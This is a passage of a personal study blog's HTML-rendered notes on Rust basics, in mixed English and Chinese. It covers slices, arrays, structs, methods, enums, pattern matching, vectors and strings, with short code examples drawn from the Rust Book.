class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> my_string = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello world&quot;</span>);<br><br>    <span class="hljs-comment">// first_word works on slices of `String`s</span><br>    <span class="hljs-keyword">let</span> word = first_word(&amp;my_string[..]);<br><br>    <span class="hljs-keyword">let</span> my_string_literal = <span class="hljs-string">&quot;hello world&quot;</span>;<br><br>    <span class="hljs-comment">// first_word works on slices of string literals</span><br>    <span class="hljs-keyword">let</span> word = first_word(&amp;my_string_literal[..]);<br><br>    <span class="hljs-comment">// Because string literals *are* string slices already,</span><br>    <span class="hljs-comment">// this works too, without the slice syntax!</span><br>    <span class="hljs-keyword">let</span> word = first_word(my_string_literal);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Compound-type"><a href="#Compound-type" class="headerlink" title="Compound type"></a>Compound type</h1><h2 id="array"><a href="#array" class="headerlink" title="array"></a>array</h2><ul><li><strong>数组是 Rust 的基本类型，是固定长度</strong> </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>  <span class="hljs-comment">// 编译器自动推导出one的类型</span><br>  <span class="hljs-keyword">let</span> one             = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>  <span class="hljs-comment">// 显式类型标注</span><br>  <span class="hljs-keyword">let</span> two: [<span class="hljs-built_in">u8</span>; <span class="hljs-number">3</span>]    = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>  <span class="hljs-keyword">let</span> blank1          = [<span class="hljs-number">0</span>; <span class="hljs-number">3</span>];<br>  <span class="hljs-keyword">let</span> blank2: [<span class="hljs-built_in">u8</span>; <span class="hljs-number">3</span>] = [<span class="hljs-number">0</span>; <span class="hljs-number">3</span>];<br><br>  <span class="hljs-comment">// arrays是一个二维数组，其中每一个元素都是一个数组，元素类型是[u8; 3]</span><br>  <span class="hljs-keyword">let</span> arrays: [[<span class="hljs-built_in">u8</span>; <span class="hljs-number">3</span>]; <span class="hljs-number">4</span>]  = [one, two, blank1, blank2];<br><br>  <span class="hljs-comment">// 借用arrays的元素用作循环中</span><br>  <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> &amp;arrays &#123;<br>    <span class="hljs-built_in">print!</span>(<span class="hljs-string">&quot;&#123;:?&#125;: &quot;</span>, a);<br>    <span class="hljs-comment">// 将a变成一个迭代器，用于循环</span><br>    <span class="hljs-comment">// 你也可以直接用for n in a &#123;&#125;来进行循环</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> a.iter() &#123;<br>      <span class="hljs-built_in">print!</span>(<span class="hljs-string">&quot;\t&#123;&#125; + 10 = &#123;&#125;&quot;</span>, n, n+<span class="hljs-number">10</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 0..a.len,是一个 Rust 的语法糖，其实就等于一个数组，元素是从0,1,2一直增加到到a.len-1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..a.len() &#123;<br>      sum += a[i];<br>    &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;\t(&#123;:?&#125; = &#123;&#125;)&quot;</span>, a, sum);<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="stuct"><a href="#stuct" class="headerlink" title="stuct"></a>stuct</h2><ul><li>Rust doesn’t allow us to mark only certain fields as mutable. As with any expression, we can construct a new instance of the struct as the last expression in the function body to implicitly return that new instance.</li><li>Unit-like structs can be useful in situations in which you need to implement a trait on some type but don’t have any data that you want to store in the type itself</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span></span> &#123;<br>    name: <span class="hljs-built_in">String</span>,<br>    age: <span class="hljs-built_in">u8</span>,<br>&#125;<br><br><span class="hljs-comment">// A unit struct</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Unit</span></span>;<br><br><span class="hljs-comment">// A tuple struct</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Pair</span></span>(<span class="hljs-built_in">i32</span>, <span class="hljs-built_in">f32</span>);<br><br><span class="hljs-comment">// A struct with two fields</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Point</span></span> &#123;<br>    x: <span class="hljs-built_in">f32</span>,<br>    y: <span class="hljs-built_in">f32</span>,<br>&#125;<br><br><span class="hljs-comment">// Structs can be reused as fields of another struct</span><br><span class="hljs-meta">#[allow(dead_code)]</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Rectangle</span></span> &#123;<br>    <span class="hljs-comment">// A rectangle can be specified by where the top left and bottom right</span><br>    <span class="hljs-comment">// corners are in space.</span><br>    top_left: Point,<br>    bottom_right: Point,<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-comment">// Create struct with field init shorthand</span><br>    <span class="hljs-keyword">let</span> name = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;Peter&quot;</span>);<br>    <span class="hljs-keyword">let</span> age = <span class="hljs-number">27</span>;<br>    <span class="hljs-keyword">let</span> peter = Person &#123; name, age &#125;;<br><br>    <span class="hljs-comment">// Print debug struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, peter);<br><br><br>    <span class="hljs-comment">// Instantiate a `Point`</span><br>    <span class="hljs-keyword">let</span> point: Point = Point &#123; x: <span class="hljs-number">10.3</span>, y: <span class="hljs-number">0.4</span> &#125;;<br><br>    <span class="hljs-comment">// Access the fields of the point</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;point coordinates: (&#123;&#125;, &#123;&#125;)&quot;</span>, point.x, point.y);<br><br>    <span class="hljs-comment">// Make a new point by using struct update syntax to use the fields of our</span><br>    <span class="hljs-comment">// other one</span><br>    <span class="hljs-keyword">let</span> bottom_right = Point &#123; x: <span class="hljs-number">5.2</span>, ..point &#125;;<br><br>    <span class="hljs-comment">// `bottom_right.y` will be the same as `point.y` because we used that field</span><br>    <span class="hljs-comment">// from `point`</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;second point: (&#123;&#125;, &#123;&#125;)&quot;</span>, bottom_right.x, bottom_right.y);<br><br>    <span class="hljs-comment">// Destructure the point using a `let` binding</span><br>    <span class="hljs-keyword">let</span> Point &#123; x: left_edge, y: top_edge &#125; = point;<br><br>    <span class="hljs-keyword">let</span> _rectangle = Rectangle &#123;<br>        <span class="hljs-comment">// struct instantiation is an expression too</span><br>        top_left: Point &#123; x: left_edge, y: top_edge &#125;,<br>        bottom_right: bottom_right,<br>    &#125;;<br><br>    <span class="hljs-comment">// Instantiate a unit struct</span><br>    <span class="hljs-keyword">let</span> _unit = Unit;<br><br>    <span class="hljs-comment">// Instantiate a tuple struct</span><br>    <span class="hljs-keyword">let</span> pair = Pair(<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>);<br><br>    <span class="hljs-comment">// Access the fields of a tuple struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, pair.<span class="hljs-number">0</span>, pair.<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// Destructure a tuple struct</span><br>    <span class="hljs-keyword">let</span> Pair(integer, decimal) = pair;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, integer, decimal);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>Refactoring with Structs: Adding More Meaning: <strong><u>use struct to wrap relative fields</u></strong> </li><li><strong>print the struct by <code>println!()</code></strong> will get an error, and because struct don’t have a provided implementation of <code>Display</code>, we can only use the <code>#[derived(Debug)]</code> just before the struct definition. Then use <code>“&#123;:?&#125;”</code> or <code>“&#123;:#?&#125;”</code> as the formatter.</li></ul><blockquote><p>Rust has provided a number of traits for us to use with the <code>derive</code> annotation that can add useful behavior to our custom types. Those traits and their behaviors are listed in <a href="https://doc.rust-lang.org/book/appendix-03-derivable-traits.html">Appendix C</a>. We’ll cover how to implement these traits with custom behavior as well as how to create your own traits in Chapter 10.</p></blockquote><ul><li>Struct Update Syntax &amp;&amp; <em>field init shorthand</em> syntax 两个挺有意思的语法. </li><li>The fields in struct that don’t implement Copy trait will lose ownership during assignment.</li><li></li></ul><h1 id="Method-syntax"><a href="#Method-syntax" class="headerlink" title="Method syntax"></a>Method syntax</h1><ul><li><p><a href="https://doc.rust-lang.org/book/ch05-03-method-syntax.html#method-syntax">definition</a> :they’re defined <strong>within the context of a struct</strong> (or an enum or a trait object) ……</p></li><li><p>intention: We’ve put all the things we can do with an instance of a type in one <code>impl</code> block rather than making future users of our code search for capabilities of <code>Rectangle</code> in various places in the library we provide.</p></li><li><p><em>automatic referencing and dereferencing</em> : when you call a method with <code>object.something()</code>, Rust automatically adds in <code>&amp;</code>, <code>&amp;mut</code>, or <code>*</code> so <code>object</code> matches the signature of the method. In other words, the following are the same:</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">p1.distance(&amp;p2);<br>(&amp;p1).distance(&amp;p2);<br></code></pre></div></td></tr></table></figure></li><li><h3 id="Associated-Functions"><a href="#Associated-Functions" class="headerlink" title="Associated Functions"></a><a href="https://doc.rust-lang.org/book/ch05-03-method-syntax.html#associated-functions">Associated Functions</a></h3><ul><li><code>impl</code> blocks allow us to define functions within <code>impl</code> blocks that <em>don’t</em> take <code>self</code> as a parameter. The usage is just like <code>String::from</code>, often used in struct builder.</li></ul></li></ul><h1 id="Enums-and-Pattern-Matching"><a href="#Enums-and-Pattern-Matching" class="headerlink" title="Enums and Pattern Matching"></a><a href="https://doc.rust-lang.org/book/ch06-00-enums.html#enums-and-pattern-matching">Enums and Pattern Matching</a></h1><h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><ul><li><p>Defining an enum with variants such as the ones in Listing 6-2 is similar to defining different kinds of struct definitions, except the enum doesn’t use the <code>struct</code> keyword and all the variants are grouped together under the <code>Message</code> type.</p></li><li><p>we can define methods on struct and the enums.</p></li><li><p><a href="https://doc.rust-lang.org/book/ch06-01-defining-an-enum.html#the-option-enum-and-its-advantages-over-null-values">The <code>Option</code> Enum and Its Advantages Over Null Values</a></p><ul><li><p>As such, Rust does not have nulls, but it does have an enum that can encode the concept of a value being present or absent. This enum is <code>Option&lt;T&gt;</code> and it is <a href="https://doc.rust-lang.org/std/option/enum.Option.html">defined by the standard library</a> as follows:</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Option</span></span>&lt;T&gt; &#123;<br>    <span class="hljs-literal">None</span>,<br>    <span class="hljs-literal">Some</span>(T),<br>&#125;<br></code></pre></div></td></tr></table></figure><p>The <code>&lt;T&gt;</code> syntax is generic type parameter.(就跟模板是一样的)</p></li><li><p>So why is having <code>Option&lt;T&gt;</code> any better than having null? In short, because <code>Option&lt;T&gt;</code> and <code>T</code> (where <code>T</code> can be any type) are <strong>different types</strong>, the common_used_operation won’t work.</p></li></ul></li></ul><h2 id="match"><a href="#match" class="headerlink" title="match"></a>match</h2><p>将模式与 <code>target</code> 进行匹配，即为<strong>模式匹配</strong> </p><h3 id="Patterns-that-Bind-to-Values"><a href="#Patterns-that-Bind-to-Values" class="headerlink" title="Patterns that Bind to Values"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#patterns-that-bind-to-values">Patterns that Bind to Values</a></h3><p>This is how we can extract values out of enum variants.</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span> <span class="hljs-comment">// so we can inspect the state in a minute</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">UsState</span></span> &#123;<br>    Alabama,<br>    Alaska,<br>    <span class="hljs-comment">// --snip--</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Coin</span></span> &#123;<br>    Penny,<br>    Nickel,<br>    Dime,<br>    Quarter(UsState),<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">value_in_cents</span></span>(coin: Coin) -&gt; <span class="hljs-built_in">u8</span> &#123; <span class="hljs-comment">//If we were to call value_in_cents(Coin::Quarter(UsState::Alaska))</span><br>    <span class="hljs-keyword">match</span> coin &#123;<br>        Coin::Penny =&gt; <span class="hljs-number">1</span>,<br>        Coin::Nickel =&gt; <span class="hljs-number">5</span>,<br>        Coin::Dime =&gt; <span class="hljs-number">10</span>,<br>        Coin::Quarter(state) =&gt; &#123; <span class="hljs-comment">//then we can use the state variable</span><br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state);<br>            <span class="hljs-number">25</span><br>&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Matching-with-Option-lt-T-gt"><a href="#Matching-with-Option-lt-T-gt" class="headerlink" title="Matching with Option&lt;T&gt;"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#matching-with-optiont">Matching with <code>Option&lt;T&gt;</code></a></h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">plus_one</span></span>(x: <span class="hljs-built_in">Option</span>&lt;<span class="hljs-built_in">i32</span>&gt;) -&gt; <span class="hljs-built_in">Option</span>&lt;<span class="hljs-built_in">i32</span>&gt; &#123;<br>        <span class="hljs-keyword">match</span> x &#123;<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-literal">None</span>,<br>            <span class="hljs-literal">Some</span>(i) =&gt; <span class="hljs-literal">Some</span>(i + <span class="hljs-number">1</span>),<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">let</span> five = <span class="hljs-literal">Some</span>(<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">let</span> six = plus_one(five);<br>    <span class="hljs-keyword">let</span> none = plus_one(<span class="hljs-literal">None</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>Combining <code>match</code> and enums is useful in many situations. You’ll see this pattern a lot in Rust code: </p><ol><li><code>match</code> against an enum, </li><li>bind a variable to the data inside, and then execute code based on it. </li></ol><p>It’s a bit tricky at first, but once you get used to it, <strong>you’ll wish you had it in all languages</strong>. It’s consistently a user favorite.</p></li></ul><h3 id="Matches-Are-Exhaustive"><a href="#Matches-Are-Exhaustive" class="headerlink" title="Matches Are Exhaustive"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#matches-are-exhaustive">Matches Are Exhaustive</a></h3><ul><li>Matches in Rust are <em>exhaustive</em>: we must exhaust <u>every last possibility in order for the code to be valid</u>. Especially in the case of <code>Option&lt;T&gt;</code>, when Rust prevents us from forgetting to explicitly handle the <code>None</code> case, it protects us from assuming that we have a value when we might have null, thus making the billion-dollar mistake discussed earlier impossible.</li></ul><h3 id="The-Placeholder"><a href="#The-Placeholder" class="headerlink" title="The _ Placeholder"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#the-_-placeholder">The <code>_</code> Placeholder</a></h3><ul><li>The <code>_</code> pattern will match any value.</li></ul><h2 id="Concise-Control-Flow-with-if-let"><a href="#Concise-Control-Flow-with-if-let" class="headerlink" title="Concise Control Flow with if let"></a><a href="https://doc.rust-lang.org/book/ch06-03-if-let.html#concise-control-flow-with-if-let">Concise Control Flow with <code>if let</code></a></h2><ul><li>In other words, you can think of <code>if let</code> as <strong>syntax sugar</strong> for a <code>match</code> that runs code when the value matches <strong>one pattern</strong> and then ignores all other values.</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> some_u8_value = <span class="hljs-literal">Some</span>(<span class="hljs-number">0u8</span>);<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-literal">Some</span>(<span class="hljs-number">3</span>) = some_u8_value &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;three&quot;</span>);<br>&#125;<span class="hljs-comment">// here can add an &quot;else&quot;</span><br><span class="hljs-comment">//equals</span><br><span class="hljs-keyword">match</span> some_u8_value &#123;<br>    <span class="hljs-literal">Some</span>(<span class="hljs-number">3</span>) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;three&quot;</span>),<br>    _ =&gt; (),<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="matches-宏"><a href="#matches-宏" class="headerlink" title="matches!宏"></a><a href="https://course.rs/basic/match-pattern/match-if-let.html#matches%E5%AE%8F">matches!宏</a></h2><p>它可以将一个表达式跟模式进行匹配，然后返回匹配的结果 <code>true</code> or <code>false</code>。</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#![allow(unused)]</span><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> foo = <span class="hljs-string">&#x27;f&#x27;</span>;<br>    <span class="hljs-built_in">assert!</span>(matches!(foo, <span class="hljs-string">&#x27;A&#x27;</span>..=<span class="hljs-string">&#x27;Z&#x27;</span> | <span class="hljs-string">&#x27;a&#x27;</span>..=<span class="hljs-string">&#x27;z&#x27;</span>));<br><br>    <span class="hljs-keyword">let</span> bar = <span class="hljs-literal">Some</span>(<span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">assert!</span>(matches!(bar, <span class="hljs-literal">Some</span>(x) <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Managing-Growing-Projects-with-Packages-Crates-and-Modules"><a href="#Managing-Growing-Projects-with-Packages-Crates-and-Modules" class="headerlink" title="Managing Growing Projects with Packages, Crates, and Modules"></a><a href="https://doc.rust-lang.org/book/ch07-00-managing-growing-projects-with-packages-crates-and-modules.html#managing-growing-projects-with-packages-crates-and-modules">Managing Growing Projects with Packages, Crates, and Modules</a></h1><h1 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common Collections"></a><a href="https://doc.rust-lang.org/book/ch08-00-common-collections.html#common-collections">Common Collections</a></h1><h2 id="Vectors"><a href="#Vectors" class="headerlink" title="Vectors"></a><a href="https://doc.rust-lang.org/book/ch08-01-vectors.html#storing-lists-of-values-with-vectors">Vectors</a></h2><h3 id="common-operation"><a href="#common-operation" class="headerlink" title="common operation"></a>common operation</h3><ul><li>Rust provides the <code>vec!</code> macro for convenience. <code>let v = vec![1, 2, 3];</code>  or  <code>let v: Vec&lt;i32&gt; = Vec::new();</code></li><li>use <code>.push()</code> to add elements</li><li>Dropping a Vector Drops Its Elements</li><li>read elements<ul><li>First method is best used when you want your program to crash if there’s an attempt to access an element past the end of the vector.</li><li>When the <code>get</code> method is passed an index that is outside the vector, it returns <code>None</code> without panicking</li></ul></li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> v = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><br><span class="hljs-keyword">let</span> does_not_exist = &amp;v[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">let</span> does_not_exist = v.get(<span class="hljs-number">100</span>);<br></code></pre></div></td></tr></table></figure><ul><li>following code won’t work, because vec may be copied to a new place </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> v = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-keyword">let</span> first = &amp;v[<span class="hljs-number">0</span>];<br>v.push(<span class="hljs-number">6</span>);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The first element is: &#123;&#125;&quot;</span>, first);<br></code></pre></div></td></tr></table></figure><ul><li>To change the value that the mutable reference refers to, we have to use the dereference operator (<code>*</code>) to get to the value in <code>i</code> before we can use the <code>+=</code> operator</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &amp;<span class="hljs-keyword">mut</span> v &#123;  <span class="hljs-comment">//let mut v = vec![100, 32, 57];</span><br>    *i += <span class="hljs-number">50</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Using-an-Enum-to-Store-Multiple-Types"><a href="#Using-an-Enum-to-Store-Multiple-Types" class="headerlink" title="Using an Enum to Store Multiple Types"></a><a href="https://doc.rust-lang.org/book/ch08-01-vectors.html#using-an-enum-to-store-multiple-types">Using an Enum to Store Multiple Types</a></h3><ul><li>when we need to store elements of a different type in a vector, we can define and use an enum!</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">SpreadsheetCell</span></span> &#123;<br>    Int(<span class="hljs-built_in">i32</span>),<br>    Float(<span class="hljs-built_in">f64</span>),<br>    Text(<span class="hljs-built_in">String</span>),<br>&#125;<br><span class="hljs-keyword">let</span> row = <span class="hljs-built_in">vec!</span>[<br>    SpreadsheetCell::Int(<span class="hljs-number">3</span>),<br>    SpreadsheetCell::Text(<span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;blue&quot;</span>)),<br>    SpreadsheetCell::Float(<span class="hljs-number">10.12</span>),<br>];<br></code></pre></div></td></tr></table></figure><h2 id="string-DOC"><a href="#string-DOC" class="headerlink" title="string(DOC)"></a>string(<a href="https://doc.rust-lang.org/stable/std/string/struct.String.html">DOC</a>)</h2><ul><li>For that, we use the <code>to_string</code> method, which is available on <strong>any type</strong> that implements the <code>Display</code> trait, as string literals do. </li><li>we can find out that the implementation of string is Vec.</li></ul><h3 id="CREATE-A-NEW-STRING"><a href="#CREATE-A-NEW-STRING" class="headerlink" title="CREATE A NEW STRING"></a>CREATE A NEW STRING</h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = <span class="hljs-built_in">String</span>::new();<br><span class="hljs-keyword">let</span> data = <span class="hljs-string">&quot;initial contents&quot;</span>;<br><span class="hljs-keyword">let</span> s = data.to_string();<br><span class="hljs-comment">// the method also works on a literal directly:</span><br><span class="hljs-keyword">let</span> s = <span class="hljs-string">&quot;initial contents&quot;</span>.to_string();<br><span class="hljs-comment">// or you can:</span><br><span class="hljs-keyword">let</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;initial contents&quot;</span>);<br><span class="hljs-comment">//strings are UTF-8 encoded, so we can include any properly encoded data, like:</span><br><span class="hljs-keyword">let</span> hello = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;السلام عليكم&quot;</span>);<br><br><br></code></pre></div></td></tr></table></figure><h3 id="UPDATING-THE-STRING"><a href="#UPDATING-THE-STRING" class="headerlink" title="UPDATING THE STRING"></a>UPDATING THE STRING</h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">s.push_str(<span class="hljs-string">&quot;initial&quot;</span>);<span class="hljs-comment">//it&#x27;s a method--</span><br>s.push(<span 